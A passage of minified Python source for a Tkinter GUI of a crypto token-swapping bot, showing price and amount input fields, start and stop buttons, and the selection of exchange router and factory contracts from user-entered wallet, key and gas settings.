text_price_of_sell=ttk.Label(root.widgets_frame,text='Price to sell at:')
text_price_of_sell.grid(row=16,column=4,padx=10,pady=(0,10),sticky=_A,rowspan=1)
input_price_of_sell=ttk.Entry(root.widgets_frame,justify=_N)
input_price_of_sell.grid(row=16,column=5,padx=10,pady=(0,10),sticky=_A,rowspan=1)
text_amount_to_sell=ttk.Label(root.widgets_frame,text='Amount to sell:')
text_amount_to_sell.grid(row=17,column=4,padx=10,pady=(0,10),sticky=_A,rowspan=1)
input_amount_to_sell=ttk.Entry(root.widgets_frame,justify=_N)
input_amount_to_sell.grid(row=17,column=5,padx=10,pady=(0,10),sticky=_A,rowspan=1)
input_price_of_buy.insert(0,price_of_buy)
input_price_of_sell.insert(0,price_of_sell)
input_amount_to_sell.insert(0,str(amount_to_sell))
button_start=ttk.Button(root.widgets_frame,text='Start Bot',command=swapper_start_initialization,style=_i)
button_stop=ttk.Button(root.widgets_frame,text='Stop Bot',command=stop_operation,style=_i)
button_start.grid(row=18,column=4,padx=10,pady=(0,10),sticky=_A,rowspan=1)
button_stop.grid(row=18,column=5,padx=10,pady=(0,10),sticky=_A,rowspan=1)
button_stop.configure(state=_D)
amount=amount_data
wallet_address=wallet_address_data
private_key=private_key_data
token=token_data
gas_limit=gas_limit_data
gas_price=gas_price_data
check_period_seconds=check_period_seconds_data
sell_now=_J
live_wallet=_J
def update_values():
	A='factory.abi';global amount;global wallet_address;global private_key;global token;global check_period_seconds;global gas_limit;global gas_price;global price_of_buy;global price_of_sell;global amount_to_sell;global dex_data;global factory;global router;amount=input_amount.get();wallet_address=Web3.toChecksumAddress(Wallet_address_input.get());private_key=Private_key_input.get();token=Web3.toChecksumAddress(Token_address_input.get());check_period_seconds=input_check_period_seconds.get();gas_limit=input_gas_limit.get();gas_price=input_gas_price.get();price_of_buy=input_price_of_buy.get();price_of_sell=input_price_of_sell.get();amount_to_sell=input_amount_to_sell.get();dex_data=dex.get()
	if dex_data==_P:router=web3.eth.contract(address=Web3.toChecksumAddress(_A8),abi=l(open(_H+_A4)));factory=web3.eth.contract(address=Web3.toChecksumAddress('0xc35DADB65012eC5796536bD9864eD8773aBc74C4'),abi=l(open(_H+A)))
	elif dex_data==_Q:router=web3.eth.contract(address=Web3.toChecksumAddress(_A9),abi=l(open(_H+_A5)));factory=web3.eth.contract(address=Web3.toChecksumAddress('0x6EcCab422D763aC031210895C81787E87B43A652'),abi=l(open(_H+A)))
inputs_and_buttons_status_second(_D)
root.mainloop()